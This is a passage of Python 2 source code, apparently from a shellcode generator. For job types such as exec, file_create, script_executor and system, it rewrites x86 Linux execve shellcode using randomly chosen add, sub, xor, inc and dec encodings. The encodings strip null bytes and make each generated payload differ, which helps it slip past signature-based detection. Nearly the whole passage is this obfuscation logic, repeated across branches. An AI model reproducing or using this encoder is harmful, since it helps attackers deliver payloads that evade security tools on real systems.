				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_sub+'\ncltd\n')
		if selected == 'xor_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) ^ int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_xor = 'push $0x%s\npop %%eax\nneg %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_xor = 'push $0x%s\npop %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_xor+'\ncltd\n')
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) - int('01', 16))
				n+= 1
				print n
			inc = 'inc %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,inc)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) + int('01', 16))
				n+= 1
				print n
			dec = 'dec %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,dec)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		encodes = ['add_random','sub_random','xor_random','inc_timesyouwant','dec_timesyouwant']
		selected = random.choice(encodes)
		if selected == 'add_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) - int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and '-' in ebx_2 and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nadd %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'sub_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'xor_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) ^ int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nxor %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) - int('01', 16))
						n+= 1
					inc = 'inc %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(inc))
					shellcode = shellcode.replace(line,command)
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) + int('01', 16))
						n+= 1
					dec = 'dec %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(dec))
					shellcode = shellcode.replace(line,command)
	if 'exec(' in job:
		shellcode = 'N' + shellcode
	if 'file_create(' in job:
		selected = random.choice(encodes)
		if selected == 'add_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) - int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_add = 'push $0x%s\npop %%eax\nneg %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')


		if selected == 'sub_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_sub+'\ncltd\n')
		if selected == 'xor_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) ^ int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_xor = 'push $0x%s\npop %%eax\nneg %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_xor = 'push $0x%s\npop %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_xor+'\ncltd\n')
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) - int('01', 16))
				n+= 1
				print n
			inc = 'inc %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,inc)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) + int('01', 16))
				n+= 1
				print n
			dec = 'dec %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,dec)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		encodes = ['add_random','sub_random','xor_random','inc_timesyouwant','dec_timesyouwant']
		selected = random.choice(encodes)
		if selected == 'add_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) - int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and '-' in ebx_2 and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nadd %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'sub_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'xor_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) ^ int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nxor %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) - int('01', 16))
						n+= 1
					inc = 'inc %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(inc))
					shellcode = shellcode.replace(line,command)
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) + int('01', 16))
						n+= 1
					dec = 'dec %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(dec))
					shellcode = shellcode.replace(line,command)
	if 'script_executor(' in job:
		selected = random.choice(encodes)
		if selected == 'add_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) - int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_add = 'push $0x%s\npop %%eax\nneg %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')


		if selected == 'sub_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_sub+'\ncltd\n')
		if selected == 'xor_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) ^ int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_xor = 'push $0x%s\npop %%eax\nneg %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_xor = 'push $0x%s\npop %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_xor+'\ncltd\n')
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) - int('01', 16))
				n+= 1
				print n
			inc = 'inc %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,inc)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) + int('01', 16))
				n+= 1
				print n
			dec = 'dec %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,dec)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		encodes = ['add_random','sub_random','xor_random','inc_timesyouwant','dec_timesyouwant']
		selected = random.choice(encodes)
		if selected == 'add_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) - int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and '-' in ebx_2 and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nadd %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'sub_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'xor_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) ^ int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nxor %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) - int('01', 16))
						n+= 1
					inc = 'inc %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(inc))
					shellcode = shellcode.replace(line,command)
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) + int('01', 16))
						n+= 1
					dec = 'dec %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(dec))
					shellcode = shellcode.replace(line,command)
	if 'system(' in job:
		selected = random.choice(encodes)
		if selected == 'add_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) - int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_add = 'push $0x%s\npop %%eax\nneg %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')


		if selected == 'sub_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) + int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_sub = 'push $0x%s\npop %%eax\nneg %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_sub = 'push $0x%s\npop %%eax\nsub $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_sub+'\ncltd\n')
		if selected == 'xor_random':
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax = str('0xb')
			while t:
				eax_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(1)))
				eax_1 = str('0') + str(eax_1[1])
				eax_2 = "%x" % (int(eax, 16) ^ int(eax_1, 16))
				if eax>eax_1:
					if '00' not in str(eax_1) and '00' not in str(eax_2):
						t = False
			A = 0	
			eax = 'push   $%s'%(str(eax))	
			if '-' in eax_2:
				A = 1
				eax_2 = eax_2.replace('-','')
				eax_xor = 'push $0x%s\npop %%eax\nneg %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			if A is 0:
				eax_xor = 'push $0x%s\npop %%eax\nxor $0x%s,%%eax\n'%(eax_2,eax_1)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_xor+'\ncltd\n')
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) - int('01', 16))
				n+= 1
				print n
			inc = 'inc %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,inc)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
			t = True
			eax_2 = str('0xb')
			n = 0
			while n<times:
				eax_2 = "%x" % (int(eax_2, 16) + int('01', 16))
				n+= 1
				print n
			dec = 'dec %eax\n' * n
			eax_add = 'push $0x%s\npop %%eax\n%s\n'%(eax_2,dec)
			shellcode = shellcode.replace('push   $0xb\npop    %eax\ncltd',eax_add+'\ncltd\n')
		encodes = ['add_random','sub_random','xor_random','inc_timesyouwant','dec_timesyouwant']
		selected = random.choice(encodes)
		if selected == 'add_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) - int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and '-' in ebx_2 and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nneg %%eax\nadd %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'sub_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) + int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nsub %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'xor_random':
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					data = line.rsplit('push')[1].rsplit('$0x')[1]
					t = True
					while t:
						ebx_1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
						ebx_2 = "%x" % (int(data, 16) ^ int(ebx_1, 16))
					
						if str('00') not in str(ebx_1) and str('00') not in str(ebx_2) and len(ebx_2) >=7 and len(ebx_1) >= 7 and '-' not in ebx_1:
							ebx_2 = ebx_2.replace('-','')
							command = '\npush $0x%s\npop %%ebx\npush $0x%s\npop %%eax\nxor %%ebx,%%eax\npush %%eax\n'%(str(ebx_1),str(ebx_2))
							shellcode = shellcode.replace(line,command)
							t = False
		if selected == 'inc_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
					ebx_2 = line.rsplit('push')[1].rsplit('$0x')[1]
					n = 0
					while n<times:
						ebx_2 = "%x" % (int(ebx_2, 16) - int('01', 16))
						n+= 1
					inc = 'inc %eax\n' * n
					command = '\npush $0x%s\npop %%eax\n%spush %%eax\n'%(str(ebx_2),str(inc))
					shellcode = shellcode.replace(line,command)
		if selected == 'dec_timesyouwant':
			times = random.randrange(1,50)
			for line in shellcode.rsplit('\n'):
				if 'push' in line and '$0x' in line and ',' not in line and len(line) > 14:
